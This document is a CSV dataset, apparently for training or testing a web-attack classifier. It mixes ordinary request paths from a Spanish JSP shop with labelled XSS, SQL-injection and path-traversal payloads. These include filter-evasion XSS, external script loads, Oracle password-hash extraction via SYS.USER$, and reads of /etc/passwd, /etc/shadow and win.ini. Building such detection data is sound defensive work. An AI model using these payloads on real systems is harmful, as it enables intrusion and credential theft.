payload,type
miembros/index.jsp,normal
"<img src=x onerror=\x00""javascript:alert(1)"">",xss
publico/miembros.jsp,normal
"`""'><img src=xxx:x onerror\x0D=javascript:alert(1)>",xss
global/creditos.jsp,normal
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>',xss
miembros/imagenes/zarauz.jpg,normal
"sov(1: select * from users where id='1' + @(1) union select 1,version() -- 1'",sqli
".UEvk: select * from users where id=1. union select null,banner from v$version where rownum=1 -- 1",sqli
or 0=0 --,sqli
"<IMG SRC=x onabort=""alert(String.fromCharCode(88,83,83))"">",xss
global/creditos.jsp,normal
"s..s: select * from users where id=1 or ""..""=1 or 1=1 -- 1",sqli
miembros/imagenes/castro.jpg,normal
publico/pagar.jsp?modo=insertar&precio=6014&B1=Pasar+por+caja,normal
..%5c..%5c..%5c..%5c{FILE},traversal
"<FRAMESET><FRAME SRC=""javascript:javascript:alert(1);""></FRAMESET>",xss
<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>,xss
"<style>.XSS{background-image:url(""javascript:document.vulnerable=true"");}</STYLE><A CLASS=XSS></a>",xss
"<IMG SRC=x onsearch=""alert(String.fromCharCode(88,83,83))"">",xss
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE},traversal
imagenes/logo.gif,normal
%2e%2e/%2e%2e/{FILE},traversal
"<;DIV STYLE="";background-image: url(&;#1;javascript:alert(';XSS';))"";>;",xss
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",xss
"'""""><script language=""JavaScript""> alert('X \nS \nS');</script>",xss
imagenes/2.gif,normal
"s&(1): select * from users where id='1' or (1)=1 union select 1,banner from v$version where rownum=1 -- 1'",sqli
publico/productos.jsp,normal
../../../../../../etc/passwd,traversal
./\/././\/././\/././\/././\/./{FILE},traversal
publico/caracteristicas.jsp?id=2,normal
"<a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:javascript:alert(1)"">XXX</a>",xss
publico/productos.jsp,normal
imagenes/1.gif,normal
imagenes/3.gif,normal
global/estilos.css,normal
publico/miembros.jsp,normal
http://www.<script>alert(1)</script .com,xss
publico/autenticar.jsp?modo=entrar&login=llaguno&pwd=cabrea_r&remember=off&B1=Entrar,normal
publico/autenticar.jsp?modo=entrar&login=goth&pwd=ensa%F1a6o&remember=off&B1=Entrar,normal
publico/miembros.jsp,normal
"<a href=""\x03javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
global/creditos.jsp,normal
/../../../../../../../../../../etc/shadow^^,traversal
miembros/imagenes/castro.jpg,normal
miembros/fotos.jsp,normal
index.jsp,normal
publico/miembros.jsp,normal
"s&.o1: select * from users where id='1' or \.<1 union select 1,@@VERSION -- 1'",sqli
publico/caracteristicas.jsp?id=2,normal
"<img src=x\x12onerror=""javascript:alert(1)"">",xss
"&lt;XML ID=\""xss\""&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\""javas&lt;!-- --&gt;cript&#58;alert('XSS')\""&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;",xss
global/titulo.jsp,normal
' or 1=1 or ''=',sqli
global/menum.jsp,normal
&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;,xss
imagenes/3.gif,normal
publico/carrito.jsp,normal
global/titulo.jsp,normal
miembros/index.jsp,normal
publico/productos.jsp,normal
"<embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",xss
publico/pagar.jsp?modo=insertar&precio=2759&B1=Confirmar,normal
imagenes/2.gif,normal
miembros/salir.jsp,normal
global/menum.jsp,normal
"s(UEf: select * from users where id=1 or 1#""( union select version(),version() -- 1",sqli
publico/miembros.jsp,normal
imagenes/cmenbul.gif,normal
publico/productos.jsp,normal
"<IMG SRC=x ondragstart=""alert(String.fromCharCode(88,83,83))"">",xss
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=92&B1=A%F1adir+al+carrito,normal
"<img src=""javascript:document.vulnerable=true;"">",xss
miembros/editar.jsp?modo=registro&login=committe&password=94cl09at8va&nombre=Ornella&apellidos=Cusell+Vinageras&email=hervert%40clinicadentalsansalvador.ch&dni=37156228G&direccion=C%2F+Quilichao+85+&ciudad=Vallclara&cp=03786&provincia=C%E1ceres&ntc=6966776615880147&B1=Registrar,normal
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=39&cantidad=73&B1=A%F1adir+al+carrito,normal
miembros/imagenes/castro.jpg,normal
miembros/imagenes/castro.jpg,normal
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->,xss
global/menum.jsp,normal
miembros/imagenes/ogono.jpg,normal
publico/autenticar.jsp?modo=entrar&login=smoot&pwd=desvanecido&remember=on&B1=Entrar,normal
global/creditos.jsp,normal
"""`'><script>\x0Bjavascript:alert(1)</script>",xss
<frameset onload=alert(123)>,xss
..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c..%c0%5c{FILE},traversal
..%2f..%2f..%2f{FILE},traversal
' or 1=1-- ,sqli
"<style><img src=""</style><img src=x onerror=alert(123)//"">",xss
"<meta HTTP-EQUIV=""Link"" Content=""<http://www.securitycompass.com/xss.css>; REL=stylesheet"">",xss
create user name identified by 'pass123',sqli
"""`'><script>\xE2\x80\x85javascript:alert(1)</script>",xss
s&n1&: select * from users where id='1' or $ 1=1 or 1=1 -- 1',sqli
..%252f{FILE},traversal
%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE},traversal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"&lt;EMBED SRC=\""data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\"" type=\""image/svg+xml\"" AllowScriptAccess=\""always\""&gt;&lt;/EMBED&gt;",xss
imagenes/logo.gif,normal
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",xss
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",xss
<script>javascript:alert(1)</script\x0D,xss
global/titulo.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,xss
"""`'><script>\xE2\x80\xAFjavascript:alert(1)</script>",xss
publico/caracteristicas.jsp?id=1,normal
global/titulo.jsp,normal
global/creditos.jsp,normal
publico/caracteristicas.jsp?id=1,normal
.../.../.../{FILE},traversal
publico/autenticar.jsp?modo=entrar&login=marylin&pwd=mantenci%F3n&remember=off&B1=Entrar,normal
sqlvuln;,sqli
"<img src\x12=x onerror=""javascript:alert(1)"">",xss
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->,xss
publico/miembros.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"<img \x12src=x onerror=""javascript:alert(1)"">",xss
' or username like char(37);,sqli
"""><script>alert(0)</script>",xss
' or 'a'='a,sqli
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},traversal
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",xss
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;,xss
miembros/fotos.jsp,normal
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},traversal
"<video src=1 href=1 onerror=""javascript:alert(1)""></video>",xss
imagenes/3.gif,normal
../../../../../../../../../../../../etc/passwd,traversal
.\..\.\..\.\..\{FILE},traversal
%252e%252e%255c%252e%252e%255c{FILE},traversal
miembros/index.jsp,normal
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss
"\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt=\'",xss
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/salir.jsp,normal
"<TABLE><TD BACKGROUND=""javascript:javascript:alert(1)"">",xss
miembros/index.jsp,normal
publico/productos.jsp,normal
"<;SCRIPT ="";blah""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",xss
"""*""",sqli
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss
publico/carrito.jsp,normal
"<IMG SRC='vbscript:msgbox(""XSS"")'>",xss
..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE},traversal
"<svg onResize svg onResize=""javascript:javascript:alert(1)""></svg onResize>",xss
"sn?s: select * from users where id=1 or ""$?"" or 1=1 -- 1",sqli
imagenes/logo.gif,normal
imagenes/nuestratierra.jpg,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},traversal
%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal
"<IMG SRC=\""jav&#x09;ascript:alert('XSS');\"">",xss
"""`'><script>\xE2\x80\x86javascript:alert(1)</script>",xss
..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE},traversal
index.jsp,normal
x' and userid is NULL; --,sqli
&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;,xss
' union select ,sqli
publico/registro.jsp?modo=registro&login=knorp5&password=0orru6t5&nombre=Am%E9n&apellidos=Gorostidi+Ponce&email=cecil.wolcott7%40librodeapuntes.sv&dni=32806661J&direccion=Calle+Tanguillo+87%2C+11%3FD&ciudad=Sorzano&cp=20200&provincia=Ourense&ntc=2795669644881744&B1=Registrar,normal
imagenes/2.gif,normal
miembros/imagenes/ogono.jpg,normal
global/titulo.jsp,normal
index.jsp,normal
imagenes/nuestratierra.jpg,normal
<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>,xss
global/menum.jsp,normal
"&no.U: select * from users where id=1 or $<\. union select 1,@@VERSION -- 1",sqli
' or user like '%,sqli
imagenes/nuestratierra.jpg,normal
publico/carrito.jsp,normal
global/titulo.jsp,normal
"<a href=""\x18javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
global/menum.jsp,normal
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",xss
@,sqli
publico/miembros.jsp,normal
&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;,xss
"<a href=""javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;""><button>",xss
"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",xss
global/creditos.jsp,normal
miembros/index.jsp,normal
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>,xss
imagenes/nuestratierra.jpg,normal
"<video src=1 href=1 onerror=""javascript:alert(1)""></video>",xss
<script>/* *\x00/javascript:alert(1)// */</script>,xss
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//,xss
"<a href=""\x19javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},traversal
miembros/imagenes/ogono.jpg,normal
miembros/fotos.jsp,normal
<script\x0A>javascript:alert(1)</script>,xss
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>",xss
imagenes/3.gif,normal
"<IMG SRC=x onpagehide=""alert(String.fromCharCode(88,83,83))"">",xss
global/titulo.jsp,normal
"<form id=""test"" /><button form=""test"" formaction=""javascript:javascript:alert(1)"">X",xss
"s.(s: select * from users where id=1 or "".("" or 1=1 -- 1",sqli
..%5c..%5c..%5c..%5c..%5c..%5c{FILE},traversal
"<a href=""\xE2\x80\x87javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
global/creditos.jsp,normal
imagenes/nuestratierra.jpg,normal
miembros/editar.jsp?modo=registro&login=dalenna&password=8on5fi4a&nombre=Atilio&apellidos=Dalmau&email=fitzmahony-mcgraw%40fotoseroticas.com.hk&dni=81621470J&direccion=C%2F+Nuestra+Se%F1ora+De+La+Cabeza+153+1%3FF&ciudad=Roperuelos+del+P%E1ramo&cp=42214&provincia=Pontevedra&ntc=4344811902014577&B1=Registrar,normal
global/estilos.css,normal
publico/caracteristicas.jsp?id=2,normal
imagenes/nuestratierra.jpg,normal
%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},traversal
imagenes/2.gif,normal
<!--[if]><script>javascript:alert(1)</script -->,xss
imagenes/2.gif,normal
having,sqli
"' union select 1,load_file('/etc/passwd'),1,1,1;",sqli
global/titulo.jsp,normal
"<a href=""data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""&#09;&#10;&#11;>X</a",xss
<IMG SRC=JaVaScRiPt:alert('XSS')>,xss
"<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>",xss
publico/carrito.jsp,normal
miembros/imagenes/ogono.jpg,normal
miembros/fotos.jsp,normal
miembros/fotos.jsp,normal
"<? foo=""><script>alert(1)</script>"">",xss
miembros/imagenes/ogono.jpg,normal
global/titulo.jsp,normal
miembros/editar.jsp?modo=registro&login=suzane&password=enmade6ar&nombre=Nancy&apellidos=Del+Cid+Labastie&email=papa%40opel-e-flex.cg&dni=02629071X&direccion=Wifred+i+92%2C+&ciudad=Margalef&cp=31049&provincia=Valencia&ntc=2362165176324303&B1=Registrar,normal
index.jsp,normal
"<img \x00src=x onerror=""javascript:alert(1)"">",xss
miembros/imagenes/castro.jpg,normal
publico/productos.jsp,normal
"s;ns: select * from users where id=1 or "";_"" or 1=1 -- 1",sqli
miembros/imagenes/castro.jpg,normal
'>><marquee><h1>XSS</h1></marquee>,xss
global/titulo.jsp,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i",sqli
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/fotos.jsp,normal
miembros/index.jsp,normal
..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215{FILE},traversal
publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=66&B1=A%F1adir+al+carrito,normal
miembros/imagenes/ogono.jpg,normal
miembros/imagenes/castro.jpg,normal
global/creditos.jsp,normal
..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025..%uF025{FILE},traversal
global/menum.jsp,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i",sqli
Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser,xss
<iframe// src=javaSCRIPT&colon;alert(1),xss
global/titulo.jsp,normal
"""><img src=x onerror=window.open('https://www.google.com/');>",xss
miembros/editar.jsp?modo=registro&login=haydock&password=01r1f9co&nombre=Delujan&apellidos=Puigdevanol+Regi&email=campion%40transportesvegasl.cat&dni=30802142J&direccion=Alcalde+Esteban+Minguez%2C+169%2C+12%3FB&ciudad=Ribadesella&cp=50345&provincia=Le%F3n&ntc=6256718045061012&B1=Registrar,normal
imagenes/1.gif,normal
<svg contentScriptType=text/vbs><script>MsgBox+1,xss
imagenes/3.gif,normal
.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\.\/\.\{FILE},traversal
miembros/imagenes/zarauz.jpg,normal
miembros/index.jsp,normal
imagenes/1.gif,normal
global/menum.jsp,normal
miembros/imagenes/ogono.jpg,normal
index.jsp,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i",sqli
publico/registro.jsp?modo=registro&login=japan&password=d37t3%F30&nombre=Alejo&apellidos=Nadeix+Laumann&email=kuneva_germaine%40ajuntamentdebcn2-0.cy&dni=44923287D&direccion=Calle+Mestre+Chapi+48%2C+&ciudad=Vilaller&cp=28609&provincia=Tarragona&ntc=5277423827718841&B1=Registrar,normal
..%252f..%252f..%252f..%252f..%252f..%252f{FILE},traversal
imagenes/logo.gif,normal
noo1&: select * from users where id=1 + $+%1 or 1=1 -- 1,sqli
"&lt;SCRIPT a=`&gt;` SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
'||UTL_HTTP.REQUEST,sqli
"&lt;META HTTP-EQUIV=\""Link\"" Content=\""&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\""&gt;",xss
"&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(""XSS"");&lt;/SCRIPT&gt;",xss
..%5c..%5c..%5c..%5c..%5c..%5c{FILE},traversal
admin' --,sqli
publico/productos.jsp,normal
imagenes/logo.gif,normal
"<a href=""javas\x09cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
miembros/fotos.jsp,normal
imagenes/1.gif,normal
publico/productos.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE},traversal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"<;IMG SRC="";jav&;#x09;ascript:alert(';XSS';);"";>;",xss
.\..\.\..\{FILE},traversal
<video poster=javascript:javascript:alert(1)//,xss
miembros/editar.jsp?modo=registro&login=dougall&password=bisonte&nombre=Olalia&apellidos=Molas+Madan&email=landesman%40cohel.mw&dni=95690740E&direccion=Sargento+Luna%2C+184+&ciudad=Villagalijo&cp=22571&provincia=Girona&ntc=9687551942893066&B1=Registrar,normal
"alert;pg(""XSS"")",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
global/titulo.jsp,normal
global/creditos.jsp,normal
global/creditos.jsp,normal
%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,traversal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"c=\""javascript&#058;\"";",xss
global/menum.jsp,normal
..///..///{FILE},traversal
miembros/imagenes/castro.jpg,normal
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini,traversal
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=41&B1=A%F1adir+al+carrito,normal
<script\x09>javascript:alert(1)</script>,xss
<script itworksinallbrowsers>/*<script* */alert(1)</script,xss
miembros/fotos.jsp,normal
"""`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>",xss
..%252f..%252f{FILE},traversal
&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=91&B1=A%F1adir+al+carrito,normal
miembros/imagenes/ogono.jpg,normal
index.jsp,normal
23 or 1=1; --,sqli
miembros/editar.jsp?modo=registro&login=de_salis&password=curul&nombre=Silvina&apellidos=Aragon%E9s&email=munio%40so-tel.bn&dni=54408548R&direccion=Calle+Valdiba%F1ez+185%2C+&ciudad=R%F3tova&cp=16452&provincia=Guadalajara&ntc=7754747447747860&B1=Registrar,normal
imagenes/nuestratierra.jpg,normal
index.jsp,normal
"s{?s: select * from users where id=1 or ""{?"" or 1=1 -- 1",sqli
"<a href=""\x0Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<meta charset=""x-imap4-modified-utf7"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>",xss
publico/miembros.jsp,normal
global/titulo.jsp,normal
imagenes/2.gif,normal
publico/miembros.jsp,normal
imagenes/1.gif,normal
miembros/imagenes/zarauz.jpg,normal
publico/pagar.jsp?modo=insertar&precio=6429&B1=Pasar+por+caja,normal
<iframe/onreadystatechange=alert(1),xss
publico/registro.jsp?modo=registro&login=gates&password=fol0aDo&nombre=Genciano&apellidos=Cedo+Rosa%27s&email=kepinska%40manuelpaloma.asia&dni=42808198T&direccion=Plza.+Santa+Maria+96+8%3FF&ciudad=Santa+Mar%EDa+de+la+Vega&cp=11639&provincia=La+Rioja&ntc=9122440516217949&B1=Registrar,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,xss
global/menum.jsp,normal
"<script onLoad script onLoad=""javascript:javascript:alert(1)""></script onLoad>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39&cantidad=31&B1=A%F1adir+al+carrito,normal
\..\..\..\..\WINDOWS\win.ini,traversal
global/titulo.jsp,normal
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",xss
imagenes/cmenbul.gif,normal
miembros/imagenes/zarauz.jpg,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
<IFRAME SRC=”http://hacker-site.com/xss.html”>,xss
imagenes/2.gif,normal
imagenes/1.gif,normal
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss
publico/miembros.jsp,normal
""" or 1=1--",sqli
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/salir.jsp,normal
global/menum.jsp,normal
..//..//..//..//..//{FILE},traversal
"s;(s: select * from users where id=1 or "";("" or 1=1 -- 1",sqli
"`""'><img src=xxx:x \x0Donerror=javascript:alert(1)>",xss
&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;,xss
<script\x00>javascript:alert(1)</script>,xss
imagenes/3.gif,normal
miembros/imagenes/castro.jpg,normal
imagenes/cmenbul.gif,normal
publico/registro.jsp?modo=registro&login=ntpadmin&password=capa0r980&nombre=Roni&apellidos=Aldunce+Garbino&email=buffet%40aou.com.tn&dni=26295439E&direccion=C%2F+Tamesis+39%2C+1%3FC&ciudad=Jana%2C+la&cp=07500&provincia=Segovia&ntc=9875693785507781&B1=Registrar,normal
"1ooUE: select * from users where id=1 + \+*\ union select null,@@VERSION -- 1",sqli
imagenes/1.gif,normal
miembros/fotos.jsp,normal
imagenes/3.gif,normal
"<IMG SRC=x onsuspend=""alert(String.fromCharCode(88,83,83))"">",xss
') or true--,sqli
&lt;,xss
\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE},traversal
"<video><source onerror=""javascript:javascript:alert(1)"">",xss
publico/carrito.jsp,normal
../../../../../../{FILE},traversal
.\/\.\.\/\.\.\/\.\.\/\.\{FILE},traversal
publico/autenticar.jsp?modo=entrar&login=gidget&pwd=p5r0i9i5ar&remember=on&B1=Entrar,normal
<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;,xss
"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",xss
publico/miembros.jsp,normal
publico/productos.jsp,normal
publico/registro.jsp?modo=registro&login=attilio&password=tu6E3a5a&nombre=Obdulio&apellidos=Gadea+Prat&email=belmondo%40artesania.org.ci&dni=39152269J&direccion=Calle+Capitan+Salas+97%2C+&ciudad=Garciaz&cp=09227&provincia=C%E1ceres&ntc=5255016250924292&B1=Registrar,normal
"<style type=""text/javascript"">document.vulnerable=true;</style>",xss
./.././../{FILE},traversal
publico/registro.jsp?modo=registro&login=chiykows&password=93tIp72ar&nombre=Wara&apellidos=Caball%E9&email=beverly.lormer%40decobiombo.ni&dni=81037080F&direccion=Particular+Basterra+108+&ciudad=Berriz&cp=47882&provincia=Zamora&ntc=7984505831107491&B1=Registrar,normal
miembros/salir.jsp,normal
publico/autenticar.jsp?modo=entrar&login=derrick&pwd=MaNUmitI6&remember=on&B1=Entrar,normal
"<image src=""javascript:alert(1)"">",xss
.//..//.//..//.//..//.//..//.//..//{FILE},traversal
%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE},traversal
global/menum.jsp,normal
imagenes/logo.gif,normal
miembros/index.jsp,normal
index.jsp,normal
publico/autenticar.jsp?modo=entrar&login=fianna&pwd=comprensi%F3n&remember=on&B1=Entrar,normal
publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=92&B1=A%F1adir+al+carrito,normal
1script3document.vulnerable=true;1/script3,xss
imagenes/nuestratierra.jpg,normal
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,xss
"<form><button formaction=""javascript:javascript:alert(1)"">X",xss
miembros/fotos.jsp,normal
"s.n: select * from users where id=1 or "".["" or 1=1 -- 1",sqli
publico/caracteristicas.jsp?id=2,normal
publico/registro.jsp?modo=registro&login=benjavan&password=MaNtateri.lla&nombre=Barcario&apellidos=Estades+Orizales&email=shaughnessy%40white-pearl-resort.nf&dni=53933880F&direccion=o+Rio%2C+134%2C+&ciudad=Elorrio&cp=02247&provincia=Navarra&ntc=1022652655889356&B1=Registrar,normal
